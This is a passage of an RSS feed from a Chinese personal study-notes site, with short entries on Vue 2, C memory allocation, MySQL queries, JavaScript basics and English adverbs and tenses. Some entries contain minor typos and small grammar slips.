特点 渐进式 可以只将网站中的一个页面或网站中的某一个区域使用 Vue 来开发。当然，也可以整个网站都用 Vue 来开发。
组件化 采用组件化开发模式，将一个复杂的网站，简化为一个个的组件，独立开发，能提高代码复用率，且让代码更好维护。
响应式 数据响应式，即后台数据（model）发生变化，前台的内容（View），也会相应的变化。
其他 不在使用传统的命令式编码，在 Vue 中，使用声明式编码，让我们无需直接操作 DOM，提高开发效率。
. 使用虚拟 DOM + 优秀的 Diff 算法，尽量复用 DOM 节点。
Vue 应用场景 前台部分页面，用户看到的网站页面。
中台全部页面，网站给某些额非官方人员提供的管理页面。比如淘宝卖家的管理后台等。
后台全部页面，网站官方的后台管理页面。</description>
    </item>
    
    <item>
      <title>Vue 实例</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</guid>
      <description>Vue 实例 new 一个 Vue 实例，并将其赋给一个配置对象 ：
var vm = new Vue({}) 该配置对象vm中有非常多的属性，大部分属性都是以$和_开头，这是为了避免与我们定义的属性重名。
以$开头的属性，都是供开发者使用的；而以_开头的属性，是内置属性，不供我们使用。</description>
    </item>
    
    <item>
      <title>使用 Vue</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</guid>
      <description>使用 Vue  引入 Vue.js。  本地 js 文件。 Vue CDN。   脚手架。  官方脚手架vue-cli。 其他民间脚手架，如webpack-simple。 手动搭建，灵活性高。    第一个 Vue 程序 创建 Vue 实例，并传给一个配置对象。
root 容器里的代码被称为 Vue 模板，模板中是插值语法{{}}，其中只能写 JavaScrip 表达式。
一个 Vue 实例，只能控制一个容器，它们之间只能一一对应。
HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;script src=&amp;#34;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  	&amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;!</description>
    </item>
    
    <item>
      <title>前端和后端</title>
      <link>https://note.yxzi.xyz/note/technology/frame/%E5%89%8D%E7%AB%AF%E5%92%8C%E5%90%8E%E7%AB%AF/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/%E5%89%8D%E7%AB%AF%E5%92%8C%E5%90%8E%E7%AB%AF/</guid>
      <description>前端和后端 前端 前端是链接终端设备与人的技术。行的网页，并配合后端做网页的数据显示和交互等可视方面的工作内容。 后端是指用户看不见的东西，通常是与前端工程师进行数据交互及网站数据的保存和读取，相对来说后端涉及到的逻辑代码比前端要多的多，后端考虑的是底层业务逻辑的实现，平台的稳定性与性能等。
所用技术 前端开发用到的技术包括但不限于 html5、css3、javascript、jquery、Bootstrap、Node.js 、Webpack，AngularJs，ReactJs，VueJs 等技术。 后端开发 以 java 为例 主要用到的 是包括但不限于 Struts spring springmvc Hibernate Http 协议 Servlet Tomcat 服务器等技术。
工作职责 前端工程师主要的工作职责分为三大部分，分别是传统的 Web 前端开发，移动端开发和大数据呈现端开发。Web 前端开发主要针对的是 PC 端开发任务；移动端开发则包括 Android 开发、iOS 开发和各种小程序开发，在移动互联网迅速发展的带动下，移动端的开发任务量是比较大的，随着 5G 标准的落地，未来移动端的开发任务将得到进一步的拓展；大数据呈现则主要是基于已有的平台完成最终分析结果的呈现，呈现方式通常也有多种选择，比如大屏展示等。 后端工程师的主要职责也集中在三大部分，分别是平台设计、接口设计和功能实现。平台设计主要是搭建后端的支撑服务容器；接口设计主要针对于不同行业进行相应的功能接口设计，通常一个平台有多套接口，就像卫星导航平台设有民用和军用两套接口一样；功能实现则是完成具体的业务逻辑实现。
知识结构 在知识结构方面，前端开发涉及到的内容包括 Html、CSS、JavaScript、Android 开发（采用 Java 或者 kotlin）、iOS 开发（采用 OC 或者 Swift）、各种小程序开发技术（类 Html），随着前端开发任务的不断拓展，前端开发后端化也是一个较为明显的趋势，比如 Nodejs 的应用。 后端开发通常需要根据业务场景进行不同语言的选择，另外后端开发的重点在于算法设计、数据结构、性能优化等方面，在具体的功能实现部分可以采用 Java、Python 或者 PHP 等编程语言来实现。对于不少中小企业来说，后端开发通常都会采用开源的开发平台，这样就可以把精力集中在业务处理上，通常应用级程序员就可以解决问题，相应的开发成本也会有大幅度的下降。
应用范围 从应用范围来看，前端开发不仅被常人所知、且应用场景也要比后端广泛的太多太多。 一是 PC (Personal Computer) 即个人电脑。目前电脑端仍是前端一个主要的领域，主要分为面向大众的各类网站，如新闻媒体、社交、电商、论坛等和面向管理员的各种 CMS (内容管理系统)和其它的后台管理系统。 二 Web App 是指使用 Web 开发技术，实现的有较好用户体验的 Web 应用程序。它是运行在手机和桌面端浏览中，随着移动端网络速度的提升，Web App 为我们提供了很大的便利。此外近两年 Google 提出了一种新的 Web App 形态，即 PWA(渐进增强 Web APP) 。三 WeChat (微信) 这个平台，拥有大量的用户群体，因此它也是我们前端开发另一个重要的领域。微信的公众号与订阅号为市场营销和自媒体从业者，打造了一个新的天地。 四 Hybrid App (混合应用) 是指介于 Web App、原生 App (主要是 Android 或 iOS )之间的 App，它兼具原生 App 良好用户交互体验的优势和 Web App 跨平台开发的优势。 五 Game（游戏），HTML5 游戏从 2014 年 Egret 引擎开发的神经猫引爆朋友圈之后，就开始一发不可收拾。不过现在游戏开发变得越来越复杂，需要制作各种炫丽炫丽的效果，还要制作各炫丽于 2D 或者 3D 的场景。 六 Desktop 桌面应用软件，就是我们日常生活中电脑中安装的各类软件。早期要开发桌面应用程序，就需要有专门的语言 UI (界面) 库支持，如 C++ 中的 Qt 库、MFC 库，Java 的 Swing、Python 的 PyQT 等，否则语言是没办法进行快速界面开发。 七 Server Node.</description>
    </item>
    
    <item>
      <title>C 动态一维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E5%8A%A8%E6%80%81%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E5%8A%A8%E6%80%81%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>动态一维数组 动态一维数组可以被当作静态一维数组来来用，换言之，静态数组可以实现的，动态数组都可以实现，不同的是，动态一维数组可以被我们使用free()函数助动释放掉，而且可以用realloc()动态的缩小或扩充。
而静态一维数组只能等当前函数执行完毕后，才会被系统自动释放。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  // 静态创建一维数组，数组大小为 20个字节  // 静态数组只能等它自己所在的函数 main 执行完毕后，才会被系统助动释放。  int a[5];   // 动态创建一维数组  // 数组长度  int len;  // 数组名  int * pArr;  //自定义数组长度  printf(&amp;#34;请输入你要存放的元素个数：&amp;#34;);  scanf(&amp;#34;%d&amp;#34;,&amp;amp;len);// 5  // 动态创建一维数组，数组大小为 20个字节，类似于 int pArr[len];  pArr = (int *)malloc(4 * len);   // 向动态数组里面添加元素  for(int i = 0; i &amp;lt; len; i++)  {  scanf(&amp;#34;%d&amp;#34;,&amp;amp;pArr[i]);  printf(&amp;#34;你向数组中添加了：%d\n&amp;#34;,pArr[i]);  }   // 输出动态数组中所有的元素  printf(&amp;#34;pArr 数组中的元素有：&amp;#34;);  for(int i = 0; i &amp;lt; len; i++)  {  printf(&amp;#34;%d、&amp;#34;,pArr[i]);  } } </description>
    </item>
    
    <item>
      <title>C 静态变量和动态变量</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%E5%92%8C%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F/</guid>
      <description>静态变量和动态变量 如果一个变量所对应的内存空间是静态分配的，那么这个变量就是静态变量。
如果一个变量所对应的内存空间是动态分配的，那么这个变量就是动态变量。
静态变量 静态变量在栈内存中分配。由程序自动分配，也由程序自动释放。在函数运行的过程中，无法被使用者手动释放，必须等函数执行完毕。
动态变量 动态变量在堆内存中分配。由使用者手动分配，也由使用者手动释放。在函数的运行的过程中，可以被使用者手动释放，不需要等待函数执行完毕。</description>
    </item>
    
    <item>
      <title>English 副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%89%AF%E8%AF%8D/</guid>
      <description>副词 用于修饰动词或形容词，有时也可以修饰数词、介词、连词、名词或一整个句子。
副词是表示行为或状态特征的词，主要作状语、也可以作表语、定语、补足语或介词宾语。
 I ate two apple quickly  当一个句子中同时出现多个不同的副词的时候，书写顺序如下：方式副词 —— 地点副词 —— 时间副词
特殊副词 在英语中，很多单词都有多重词性，比如一些单词，可以作副词，也可以作形容词，有些还有其他词性。
 High Deep Hard Early  high  The mountain is high.（形容词） The kite is flying high.（方式副词）  副词的比较级和最高级 副词也有比较级和最高级，但是注意了，一般情况下，只有方式副词才有比较级和最高级，其他副词一般没有，比较级和最高级的构成方式和形容词是一样的。
 I run faster than he. She speaks more slowly than than me. She did her homework more carefully than me.  </description>
    </item>
    
    <item>
      <title>English 地点副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%9C%B0%E7%82%B9%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E5%9C%B0%E7%82%B9%E5%89%AF%E8%AF%8D/</guid>
      <description>地点副词 大部分表示地点、方位的词语都是用介词短语来表示。地点副词也是主要作地点状语，当然，也不是每一个地点副词都可以作地点状语的。
 here there upstairs  地点副词和时间副词不同的，地点副词作地点状语的时候通常不受时态的影响，只要符合逻辑，基本大部分时态都可以用地点副词作状语。
一般情况，当一句话中同时出现地点状语和时间状语，那么，地点状语通常在前面，时间副词在后面
 I am visiting a friend here. I learn English here every day. They are having a party outside. They are safe abroad. We see ads everywhere.  少数地点副词可以作后置定语修饰名词。  The house here are expensive. The house abroad are expensive. We girl ustairs likes joe.  少数地点副词可以作表语。 作表语的时候，直接将地点副词放到系动词 be 后面。
 I am here. I was here last night. They are there.</description>
    </item>
    
    <item>
      <title>English 方式副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%96%B9%E5%BC%8F%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%96%B9%E5%BC%8F%E5%89%AF%E8%AF%8D/</guid>
      <description>方式副词 表示动作的方式的词语。
 Very much Loudly. fast.  方式副词只能作方式状语，并且只能修饰实义动词，所以方式副词只能用在动作的句子里面。
方式副词绝大部分放在句尾，少数情况可以放在中间和句首。
大部分的方式副词都是形容词 + ly 构成的，也有一部分是独立的。所以不能单看 ly 来判断某个单词是否是方式副词。比如 hard、fast 这两个没有 ly 结尾，但都是方式副词，而 friendly、lovely 这两个都有 ly 结尾，但是属于形容词，不是方式副词。
 I love you very much. I like your book very much. She cried suddenly. He always does his homework carefully. I speak English slowly.  当一个句子中同时出现多个不同的副词的时候，书写顺序如下：方式副词 —— 地点副词 —— 时间副词
 She did her homework carefully upstairs last night. He is working hard outside now. My borther reads English loudly upstairs every day.</description>
    </item>
    
    <item>
      <title>English 时间副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%97%B6%E9%97%B4%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%97%B6%E9%97%B4%E5%89%AF%E8%AF%8D/</guid>
      <description>时间副词 表示时间的副词，就是时间副词。
 just now early before recently already just  时间副词数量比较少，副词数量少的原因主要是，表示时间的词语大部分由介词短语构成。
同一句话，其实可以跟两个或两个以上的时间状语，但是要注意逻辑和顺序。通常是短（小范围）的时间状语在前，长（大范围—）的间状语在后。
 I get up early every morning. She goes to bed at 10:30 every night.  时间状语主要作时间状语，大部分在情况放在句尾。
时间副词作时间状语的时候，要特别的注意时态的问题，不同的时间副词，能用在不同的时态里面，有些时间副词不能用在特定的时态。比如
 I am learning English now.  Now Now 主要用在现在进行时态里面，当然，也可以用在其他时态，但当 now 用在其他时态的时候，通常有其他的意思。
 I am busy now. She is tired now. Joe is tired now.  Soon Soon 主要用在一般将来时态。
 I will go home soon. I will be rich soon.</description>
    </item>
    
    <item>
      <title>English 程度副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E7%A8%8B%E5%BA%A6%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E7%A8%8B%E5%BA%A6%E5%89%AF%E8%AF%8D/</guid>
      <description>程度副词 表示某种程度的词语。
比如表示“很、非常、特别、超好、超、相当好、如此、格外的、真正的、完全”的单词。
程度副词相当于一种限定词的作用，主要修饰形容词和方式副词，放在被修饰的形容词和方式副词的前面。
 vary good. so good. too bad. pretty good. almost dead.  Much 这个词语很特使，作程度副词的时候，必须修饰形容词的比较级或方式副词的比较级，表示“&amp;hellip;的多”。
 Much better. Much bigger. Much harder.  程度副词也可以修饰方式副词。
 He is running very quickly. He sings very well. The snail walks pretty.  程度副词只与被修饰的词语有关系，跟句子的关系不大，因此，只要句子中出现形容词和方式副词，都可以根据语境加上程度副词，哪里有形容词和方式副词，哪里就可以又程副词。
 We need a very good teacher. My book is very good. A very rich man married her.  少部分程度副词还可以修饰动词或数词，甚至是名词。
 He nearly died four yeary ago, The man almost dropped his gun,  Very 这个程度副词，不喜欢修饰动词，所以 I very lik you 这个句子不地道，也不太好。应该用 I like you very</description>
    </item>
    
    <item>
      <title>English 频度副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E9%A2%91%E5%BA%A6%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E9%A2%91%E5%BA%A6%E5%89%AF%E8%AF%8D/</guid>
      <description>频度副词 频度副词也作状语只是位置不同。频度副词放在实义动词前面，放在系动词、助动词、情态动词后面。
 I often eat rice. I always busy. He usually gets up at six.  </description>
    </item>
    
    <item>
      <title>English 现在完成时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E5%AE%8C%E6%88%90%E6%97%B6%E6%80%81/</link>
      <pubDate>Thu, 07 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E5%AE%8C%E6%88%90%E6%97%B6%E6%80%81/</guid>
      <description>现在完成时态 由助动词 + have/has + 过去分词构成。
用法一 表示从过去某一时间开始一直延续到现在并还可能继续延续下去的动作。不能用非延续性的动词，比如 die、begin、 buy。
 I have been here for two days. He has been an English teacher for 2 years.  表示过去的动作，对现在产生的影响。
 I have already known the story. She has nerver seen the sea. He has died. I have found her money. She has bought a car.  用法二 第三人称单数 + has + 过去分词
非第三人称单数 + have + 过去分词</description>
    </item>
    
    <item>
      <title>English 现在进行时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E8%BF%9B%E8%A1%8C%E6%97%B6%E6%80%81/</link>
      <pubDate>Thu, 07 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E8%BF%9B%E8%A1%8C%E6%97%B6%E6%80%81/</guid>
      <description>现在进行时态 表示主语此时此刻正在进行的动作。一般情况，这个时态没有状态的句子，只有动作的句子。
现在进行时态的注意事项 有一部分动词是不可以用在现在进行时态里面的。
比如表示知觉、结果、态度、情感的词语。
see 表示“看到、看见”的意思，而“看到”是一个结果，没有“我正在看到你”这种逻辑。
所以在英语中，不能说
 I am seeing you.  如果要表示“看”，那可以用 look at. 可以说
 I am looking at you.  同样的，hear（听到）和 listen to（听）也是不能混用的。
现在进行时态的特殊用法 表示目前一段时间内正在进行的动作  What&amp;rsquo;s he doing this week? He is writing a book.（强调这个周一直再写一本书）  表示反复出现或习惯性的动作 现在进行时态常与 always constantly 连用，来表示反复出现或习惯性的动作，类似于一般现在时态的作用。
一般情况，用现在进行时态来表达反复出现或习惯性的动作的时候，主要是强调感情色彩，比如抱怨、表扬、厌倦等等。
 She is always helping her friend.（表扬） You mother is always giving you money.（羡慕或嫉妒） You mother is always gives you money.（没有感情色彩，仅仅表示经常性的动作） You are always borrowing money from me.</description>
    </item>
    
    <item>
      <title>MySQL 基础查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/</guid>
      <description>基础查询 我们用的是名为 MyEmployees.sql 和 Girls.sql 的 SQL 文件。
语法 select 查询列表 from 表名 特点  查询列表可以是表中的字段、常量、表达式、函数。 查询的结果是一个虚拟的表格。  查询表中的单个字段 SELECT last_name FROM employees; 查询表中的多个字段 会以特定的顺序显示我们查询的字段。
SELECT last_name,first_name,email FROM employees; 查询表中的所有字段 会以表原本的字段顺序显示我们查询的字段
SELECT * FROM employees; 区分关键字和字段名 MySQL 中，我们可以用一对着重号**``**来区 MySQL 中的分字段和关键字
SELECT `NAME` FROM rainy; 查询常量 SELECT &amp;#39;john&amp;#39;; 查询表达式 SELECT 100 * 57; 起别名 自定义字段名（列名），起别名可以使我们更好的理解表。
有时候，字段名可能会是一些表达式，会让输出的虚拟表达中的字段名难以理解，这时候，我们可以为其设置一个便于理解的字段名。
表达式可以用这个表达式的别名来代替该表达式 当我们为一个表达式定义了一个别名，如果后续我们需要用到这个表达式，那么我们可以不用再重复书写表达式，直接写别名即可。
SELECT *, # 因为表中没有年薪这个字段，所以我们需要用表达式来计算每个员工的年薪 salary * 12*(1 + IFNULL(commission_pct,0)) AS 年薪 FROM employees # 用表达式所对应的别名来替代表达式，使得语句更好理解 ORDER BY 年薪 DESC; 如果要查询的字段中有重名的情况，也可以使用别名来区分。</description>
    </item>
    
    <item>
      <title>MySQL 条件查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/</guid>
      <description>条件查询 语法 select # 3、查询 	QueryList from # 1、寻找库中有无指定名 TableName WHERE # 2、筛选满足条件的字段 	Conditional Expression; 分类  按条件表达式查询，主要用条件运算符 按逻辑表达式查询，主要用逻辑运算符 模糊查询，主要用模糊关键字  &amp;gt; 大于。
查询工资大于 12000 的员工信息 SELECT * FROM employees WHERE salary &amp;gt; 12000; &amp;lt; 小于。
= 等于。
&amp;lt;&amp;gt; 不等于，也可以用 !=，但是在 MySQL 中 建议中 &amp;lt;&amp;gt;。
查询部门编号不等于 90 号的员工名和部门编号 SELECT last_name, department_id FROM employees WHERE department_id &amp;lt;&amp;gt; 90; &amp;gt;= 大于等于。
&amp;lt;= 小于等于。</description>
    </item>
    
    <item>
      <title>MySQL 语法规范</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</guid>
      <description>语法规范   MySQL 的 SQL 语法不区分大小写，但建议关键 i 大写，表名，列名小写。
  每条命令结尾必须使用英文的分号;结尾，当然也可以用其他的，比如\g。
  每条命令根据需要，可以进行缩进或换行。
mysql&amp;gt; show  -&amp;gt; databases;   注释
# 单行注释 -- 单行注释 /* 多行注释 */覆   </description>
    </item>
    
    <item>
      <title>MySQL 逻辑查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E9%80%BB%E8%BE%91%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E9%80%BB%E8%BE%91%E6%9F%A5%E8%AF%A2/</guid>
      <description>逻辑查询 AND 与运算符，也可以用 &amp;amp;&amp;amp;，但是在 MySQL 中，建议用 and。
当表达式都为 true 时，结果才为 true，否则结果为 false。
查询工资在 10000-20000 之间的员工名、工资以及奖金 SELECT last_name, salary, commission_pct FROM employees WHERE salary &amp;gt;= 12000 AND  salary &amp;lt;= 20000; OR 或运算符，但也可以用 ||，但是在 MySQL 中，建议用 or。
当表达式都为 false 时，结果才为 false，否则结果为 true。
查询部门编号不在 90 - 100 之间，或者工资高于 15000 的员工信息 SELECT * FROM employees WHERE # 筛选部门 id 小于 90 或 大于 100 d department_id &amp;lt; 90 OR department_id &amp;gt; 110 OR  salary &amp;gt; 15000; NOT 非运算符，但也可以用 !</description>
    </item>
    
    <item>
      <title>English 一般将来时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E5%B0%86%E6%9D%A5%E6%97%B6%E6%80%81/</link>
      <pubDate>Tue, 05 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E5%B0%86%E6%9D%A5%E6%97%B6%E6%80%81/</guid>
      <description>一般将来时态 表示未来即将要发生的动作和状态，也就是说，这些动作和状态还没有发生，但是在将来的某个时间点肯定要发生。
一般将来时态有两种构成方式，will 和 be going to，这两个都是助动词，没有中文意思。虽然它们写法不一样，但是作用是一样的。
一般将来时态的时间状语 一般情况，一般将来时态都需要加上表示将来的时间状语。
 tomorrow. tonight. the day ater tomorrow  大部分表示将来的时间状语，都是由介词或副词 + 其他词语构成。
Next + 表示时间名词的单数  I will travel next year.  After + 具体时间点（&amp;hellip;之后） 这里的具体时间点表示的是特定或规定的时间。
比如：几岁之后、几个月以后、清明节之后、三月之后等等。
 After work Afer school After two days old. After 2030. After May. Afer Ching ming festival. I will buy a house after 2030.  after + 一段时间（之后）
注意 after + 一段时间，比如 after + one/a/an + 表示是时间名词的单数，也可以构成时间状语，但是这种介词短语不能用在一般将来时态，用在一般过去时态。</description>
    </item>
    
    <item>
      <title>JavaScript DOM</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/dom/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/dom/</guid>
      <description>DOM DOM （文档对象模型）中提供了一系列的方法，DOM 是这一些列方法的统称。这些方法使得我们可以操作 HTML 和 XML。
DOM 就像一棵节点树一样，从文档的根（document），依次分支展开，每一个元素，都可以看作是树的一个节点，每一个元素都是一个对象。
使用 DOM 操作文档中的元素时，必须先加载整个 HTML 文档（body 之前的代码 ），再加载 JS 文件；因为没有完整的 DOM 模型，DOM 的一些操作就无法完成，会导致报错。
graph TD;Node --&amp;gt; Document;Node --&amp;gt; CharacterData;Node --&amp;gt; Element;Node --&amp;gt; Atrr;Document --&amp;gt; HTMLDocument;Document --&amp;gt; XMLDocument;CharacterData --&amp;gt; TextCharacterData --&amp;gt; CommentElement --&amp;gt; HTMLElementAttrHTMLElement --&amp;gt; HTMLHeadElementHTMLElement --&amp;gt; HTMLBodyElementHTMLElement --&amp;gt; HTMLTitleElementHTMLElement --&amp;gt; HTMLParagraphlement Node 最终指向 Object.prototype。
getElementById() getElementById() 定义在了 Document.prototype 上，这说明 XMLDocument 和 HTMLDocument 都能使用 getElementById()，但 Element 不能使用 getElementById()。</description>
    </item>
    
    <item>
      <title>JavaScript ES5 严格模式</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/es5-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/es5-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/</guid>
      <description>ES5 严格模式 ECMAScript 是 JavaScript 的一个标准。
ES5 严格模式指的是：我们应该对 ES3 和 ES5 产生冲突的部分使用哪个版本的规则？
当我们开启 ES5 严格模式后，那么 ES3 和 ES5 产生冲突的部分会遵循 ES5 的规则，否则会使用 ES3（浏览器默认遵循 ES3 的规则）
&amp;ldquo;use strict&amp;rdquo; 使某一作用域内的代码不在兼容 ES3 中的一些不规则的语法，使用全新的 ES5 的语法。
如何启用 ES5 严格模式 在作用域顶端添加语句&amp;quot;use strict&amp;quot;即可，启用之后，ES3 中的一些方法就无法使用了。比如arguments的callee属性：
&amp;#39;use strict&amp;#39;; function test() { 	console.log(arguments.callee); } test(); 浏览器会出现以下错误：
Uncaught TypeError: &amp;#39;caller&amp;#39;, &amp;#39;callee&amp;#39;, and &amp;#39;arguments&amp;#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them 同样，也可以使某一局部作用域支持 ES5，而其他作用域支持 ES3：</description>
    </item>
    
    <item>
      <title>JavaScript Try Catch</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%8E%A7%E5%88%B6%E6%B5%81/try-catch/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%8E%A7%E5%88%B6%E6%B5%81/try-catch/</guid>
      <description>Try Catch 为了容错，防止程序报错后引起整个程序的终止运行
try 中有错误信息 就会执行 catch 中的代码，没有这不会执行 catch 之中的代码
catch 有一个参数，参数名自定义 比如 e
那么这个 e 就会有两个参数 e.name 和 e.message
Error.name EvalError：eval()的使用与定义不一致
RangeError：数值越界
ReferenceError：非法或不能识别的引用数值，比如当一个变量未经声明就使用或者一个函数未定义就调用的时候，会出现 ReferenceError。
SyntaxError：语法解析错误
TypeError：操作数类型错误
URlError：URI 处理函数使用不当</description>
    </item>
    
    <item>
      <title>JavaScript with</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/other/with/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/other/with/</guid>
      <description>with with(ogj)函数可以改变自身代码块中的代码的作用域链，它会将 obj 放到它自己代码块中的代码的作用域链的最顶端，也就是会先去 obj 的作用域中去寻找变量。
